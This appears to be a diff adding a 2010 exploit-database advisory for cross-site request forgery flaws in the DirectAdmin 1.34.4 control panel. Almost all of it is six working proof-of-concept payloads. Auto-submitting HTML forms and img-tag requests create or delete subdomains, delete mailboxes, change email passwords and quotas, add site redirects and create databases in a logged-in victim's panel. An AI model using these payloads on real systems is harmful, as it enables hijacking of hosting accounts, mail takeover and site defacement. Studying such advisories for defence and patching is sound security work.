@@ -1,0 +1,77 @@
+=============================================================================
+# Title : Multi CSRF vulnerability in DirectAdmin (1.34.4) 
+# Date : 20-3-2010
+# Version : 1.34.4
+# Author : K053 [K053.Dev0te3 _AT_ gmail]
+# Tested on : Ubuntu
+# Vendor : http://www.directadmin.com/
+# Download : http://www.directadmin.com/demo.html
+=============================================================================
+# info : DirectAdmin is a graphical web-based web hosting control panel 
+         designed to make administration of websites easier.
+-----------------------------------------------------------------------------
+>> Here I have listed some poc , maybe you find more ;)		 
+-----------------------------------------------------------------------------
+# poc 1  : Add Subdomain | 
+-------------------------
+ <html>
+ <title>Add subdomain</title>
+ <form name="info" action="http://address:port/CMD_SUBDOMAIN" method="post">
+    <input type=hidden name=domain value="domain_name">
+    <input type=hidden name=action value="create">
+	<input type=hidden name=subdomain value="test">
+    <input type="hidden" value="Submit">
+<body onload="document.forms.info.submit();">
+</html> 
+-----------------------------------------------------------------------------
+# poc 2 : Delete Subdomain |
+---------------------------
+ <html>
+ <title>Delete subdomain</title>
+ <form name="del" action="http://address:port/CMD_SUBDOMAIN" method="post">
+	<input type=hidden name=domain value="domain_name">
+    <input type=hidden name=action value="delete">
+	<input type=hidden name=contents value="yes">
+	<input type=hidden name=[selectX] value="subdomain_name">
+	<input type="hidden" value="Submit">
+<body onload="document.forms.del.submit();">
+</html>
+
+Note : You msut set proper name stead selectx, for example if test subdomain
+       is at number 2 in list, should set it select1.	   
+-----------------------------------------------------------------------------
+# poc 3 : Delete Email    |
+---------------------------
+ <html>
+ <title>Delete Email</title>
+ <form name="del" action="http://address:port/CMD_EMAIL_POP" method="post">
+	<input type=hidden name=domain value="domain_name">
+    <input type=hidden name=action value="delete">
+	<input type=hidden name=selectx value="put_mail">
+	<input type="hidden" value="Submit">
+ <body onload="document.forms.del.submit();">
+ </html>
+ 
+Note : You msut set proper name stead selectx, for example if test Mail is at 
+       number 2 in list, should set it select1.	   
+-----------------------------------------------------------------------------
+# poc 4 : Change Email Configuration   |
+-----------------------------------
+<img src=http://address:port/CMD_EMAIL_POP?action=modify&domain=domain_name&user
+=username&newuser=username&passwd=mypasswd&passwd2=mypasswd&quota=0&update=Modify>
+
+Note : Able to Cahnge quota, password & Name
+-----------------------------------------------------------------------------
+# poc 5 : Set Redirection  |
+----------------------------
+<img src=http://address:port/CMD_REDIRECT?domain=domain_name&action=add
+&from=%2F&type=301&to=http://google.com
+
+Note : Change from value if you want set redirection for specific direction.
+-----------------------------------------------------------------------------
+# poc 6 : Add Database   |
+--------------------------
+<img src=http://address:port/CMD_DB?action=create&domain=domain_name&name=b0f
+&user=b0f&passwd=frenzy&passwd2=frenzy&create=Create>
+-----------------------------------------------------------------------------
+
